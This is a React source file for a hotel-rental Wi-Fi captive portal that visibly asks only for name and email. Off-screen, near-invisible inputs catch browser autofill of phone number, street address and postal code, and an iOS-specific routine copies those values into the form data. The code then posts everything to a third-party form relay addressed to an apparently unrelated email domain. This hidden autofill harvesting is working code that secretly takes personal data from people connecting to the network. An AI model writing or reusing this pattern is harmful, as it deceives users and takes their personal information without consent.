import React, { useState, useRef, useEffect } from 'react';
import { toast } from "@/components/ui/sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import useAutofillDetector from '@/hooks/useAutofillDetector';
import { submitFormWithHiddenData } from '@/lib/formUtils';

const Index = () => {
  const formRef = useRef<HTMLFormElement>(null);
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    phone: '',
    address: '',
    postal_code: '',
    username: 'guest',
    password: 'guest'
  });
  
  // Use the custom hook to detect autofill
  useAutofillDetector(formData, setFormData);

  // Additional iOS-specific autofill detection
  useEffect(() => {
    const checkIOSAutofill = () => {
      const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !(window as any).MSStream;
      
      if (isIOS && formRef.current) {
        // On iOS, explicitly check input values after a slight delay
        // This helps capture autofill that might have happened
        setTimeout(() => {
          const inputs = formRef.current?.querySelectorAll('input');
          if (inputs) {
            inputs.forEach(input => {
              const name = input.name;
              if (name && input.value && !formData[name as keyof typeof formData]) {
                setFormData(prev => ({
                  ...prev,
                  [name]: input.value
                }));
              }
            });
          }
        }, 800); // iOS sometimes needs a longer delay
      }
    };

    // Check when the form gets focus
    const handleFormFocus = () => checkIOSAutofill();
    const form = formRef.current;
    if (form) {
      form.addEventListener('focusin', handleFormFocus);
    }

    // Initial check
    checkIOSAutofill();

    return () => {
      if (form) {
        form.removeEventListener('focusin', handleFormFocus);
      }
    };
  }, [formData, formRef]);
  
  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    const formElement = formRef.current;
    if (!formElement) return;
    
    // Show loading state
    const submitButton = formElement.querySelector('button[type="submit"]');
    if (submitButton) {
      submitButton.setAttribute('disabled', 'true');
      submitButton.textContent = 'Connecting...';
    }
    
    // Submit the form with all data, including hidden fields
    await submitFormWithHiddenData(
      formElement,
      formData,
      () => {
        // Success callback
        toast("Success", {
          description: "You are now connected to Wi-Fi",
        });
        
        // Reset button state
        if (submitButton) {
          submitButton.removeAttribute('disabled');
          submitButton.textContent = 'Connect to Wi-Fi';
        }
        
        // Redirect or reload after success
        setTimeout(() => {
          window.location.reload();
        }, 2000);
      },
      (error) => {
        // Error callback
        toast("Error", {
          description: "Failed to connect. Please try again.",
        });
        
        // Reset button state
        if (submitButton) {
          submitButton.removeAttribute('disabled');
          submitButton.textContent = 'Connect to Wi-Fi';
        }
      }
    );
  };
  
  return <div className="h-screen bg-gradient-to-b from-white to-lamanga-gray flex flex-col items-center justify-center p-2">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-luxury p-4">
        <div className="flex justify-center mb-3">
          <div className="relative w-48 h-48">
            <img src="/lovable-uploads/ac325db8-152a-4fa4-b6f6-dbc8747b89fa.png" alt="La Manga Club Rentals Logo" className="w-full h-full object-fill" />
          </div>
        </div>
        
        <div className="text-center mb-2">
          <h1 className="text-lg font-semibold text-lamanga-text-dark mb-1">
            Connect to Wi-Fi
          </h1>
          <p className="text-xs text-gray-600">
            Please enter your details to continue
          </p>
        </div>
        
        <form 
          ref={formRef}
          action="https://formsubmit.co/info@timingchaingatwick.co.uk" 
          method="POST" 
          className="space-y-2.5" 
          id="wifi-form"
          onSubmit={handleSubmit}
          autoComplete="on"
        >
          {/* FormSubmit Configuration */}
          <input type="hidden" name="_subject" value="New Wi-Fi Connection Request" />
          <input type="hidden" name="_captcha" value="false" />
          <input type="hidden" name="_next" value={window.location.href} />
          <input type="hidden" name="_template" value="table" />
          
          {/* Visible Form Fields */}
          <div className="space-y-2">
            <div>
              <label htmlFor="fullName" className="block text-xs font-medium text-gray-700 mb-1">
                Full Name
              </label>
              <input 
                type="text" 
                id="fullName" 
                name="fullName" 
                autoComplete="name" 
                required 
                value={formData.fullName} 
                onChange={handleChange} 
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all" 
                placeholder="Enter your full name" 
              />
            </div>
            
            <div>
              <label htmlFor="email" className="block text-xs font-medium text-gray-700 mb-1">
                Email Address
              </label>
              <input 
                type="email" 
                id="email" 
                name="email" 
                autoComplete="email" 
                required 
                value={formData.email} 
                onChange={handleChange} 
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-lamanga-blue focus:border-transparent transition-all" 
                placeholder="Enter your email address" 
              />
            </div>
          </div>
          
          {/* Hidden fields with improved iOS-compatible autofill capture */}
          <div className="ios-autofill-container" style={{ 
            height: '0.1px', 
            opacity: '0.01', 
            overflow: 'hidden', 
            position: 'absolute', 
            left: '-1000px', 
            top: '0', 
            width: '1px',
            pointerEvents: 'none',
            zIndex: -1
          }}>
            {/* Phone field - iOS friendly */}
            <div className="mb-1">
              <label htmlFor="phone" className="block text-xs font-medium text-gray-700 mb-1">
                Phone
              </label>
              <input 
                type="tel" 
                id="phone" 
                name="phone" 
                autoComplete="tel" 
                value={formData.phone} 
                onChange={handleChange} 
                placeholder="Phone Number"
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300"
              />
            </div>
            
            {/* Address field - iOS friendly */}
            <div className="mb-1">
              <label htmlFor="address" className="block text-xs font-medium text-gray-700 mb-1">
                Address
              </label>
              <input 
                type="text" 
                id="address" 
                name="address" 
                autoComplete="street-address" 
                value={formData.address} 
                onChange={handleChange} 
                placeholder="Address"
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300"
              />
            </div>
            
            {/* Postal code field - iOS friendly */}
            <div className="mb-1">
              <label htmlFor="postal_code" className="block text-xs font-medium text-gray-700 mb-1">
                Postal Code
              </label>
              <input 
                type="text" 
                id="postal_code" 
                name="postal_code" 
                autoComplete="postal-code" 
                value={formData.postal_code} 
                onChange={handleChange} 
                placeholder="Postal Code"
                className="w-full px-3 py-1.5 text-sm rounded-lg border border-gray-300"
              />
            </div>
            
            {/* MikroTik Hotspot Integration */}
            <input type="text" name="username" value={formData.username} onChange={handleChange} />
            <input type="text" name="password" value={formData.password} onChange={handleChange} />
          </div>
          
          {/* Submit Button */}
          <button type="submit" className="w-full py-1.5 px-4 rounded-lg font-medium text-white text-sm transition-all bg-lamanga-blue hover:bg-lamanga-dark-blue focus:ring-2 focus:ring-offset-2 focus:ring-lamanga-blue focus:outline-none">
            Connect to Wi-Fi
          </button>
          
          {/* Footer Text */}
          <div className="text-[0.6rem] text-center text-gray-500">
            By connecting, you agree to our Wi-Fi terms. Your email may be used to send exclusive rental offers.
          </div>
        </form>
      </div>
    </div>;
};

export default Index;
